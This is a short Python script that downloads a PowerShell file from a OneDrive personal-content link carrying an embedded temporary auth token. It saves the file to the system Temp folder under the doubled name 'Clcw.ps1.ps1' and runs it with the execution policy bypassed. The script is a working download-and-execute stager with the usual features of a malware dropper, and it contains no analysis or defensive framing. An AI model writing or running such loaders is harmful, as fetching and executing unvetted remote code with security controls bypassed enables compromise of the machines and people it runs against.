import requests
import os
import subprocess

# Your OneDrive link
url = "https://my.microsoftpersonalcontent.com/personal/3ce6f8bdc7595cee/_layouts/15/download.aspx?UniqueId=fce1458c-1c5f-4a15-b69b-fe001711382c&Translate=false&tempauth=v1e.eyJzaXRlaWQiOiI1MWE5MjdkYS05ODQ4LTQ4YzktOGE4NC0wZGUwYjJlNmJjODkiLCJhdWQiOiIwMDAwMDAwMy0wMDAwLTBmZjEtY2UwMC0wMDAwMDAwMDAwMDAvbXkubWljcm9zb2Z0cGVyc29uYWxjb250ZW50LmNvbUA5MTg4MDQwZC02YzY3LTRjNWItYjExMi0zNmEzMDRiNjZkYWQiLCJleHAiOiIxNzUyMDU1MDk5In0.vBIvsb6I7OGXAerp8cdnqtlfkkE0dUdVVzJmfyqLyG5UOch6BUFSPtUHp4RRvL2qIWWYXOWi380hcu_EZyJh6E5o_uF0hRNSfUccCn5HDMr7i93dEB2Vca3nuFPlJPvxsY6y52PKaE2pk3Nky5M5rMWB6ZLe83XVBy8NUyu0VD_Qu-AIkpVZZcK9nhm8lGUWfVQn_3OMtzr5R9Vqjykut9bf2jK571KZ1UOkmGFToXJdCqH5CQLwq0yGKsblsFuSrCha7EXGj_viTojxMKJjN7_TWr8nO3oZCeK2xh2Zlu2sgQnmdY615HJy-GP1IKuDoajJQ55XpR4BRoh6FLaSti5EPu24QsJezrvSrzrm0y0WsYxiw9AYNGAgFFfZge6WGC7hN1nh2uHqlGtAenhvRktXCUbjzxVTz4xL4vaXHEk8GTtCsge4qBXGGiuvm4LoYsVqBjz_LxiwhWEaB-NB-wf1NSCP3O3bNs_4IE1Gg0Q1TFikzWHR7893D8EQ92ngC4EAq3miFKkyrwDomfZh-Q.UqQxF-o15DBjr0xwe1qITozztufbsLTt7ze9DYa-ks0&ApiVersion=2.0"

# Get the system Temp folder path
temp_folder = os.environ.get('TEMP', '/tmp')
file_path = os.path.join(temp_folder, 'Clcw.ps1.ps1')

# Download the file
r = requests.get(url, allow_redirects=True)
with open(file_path, 'wb') as f:
    f.write(r.content)

print(f"File downloaded to {file_path}")

# Execute the downloaded PS1 script
try:
    subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", file_path], check=True)
    print("PowerShell script executed successfully.")
except subprocess.CalledProcessError as e:
    print(f"Error executing PowerShell script: {e}")
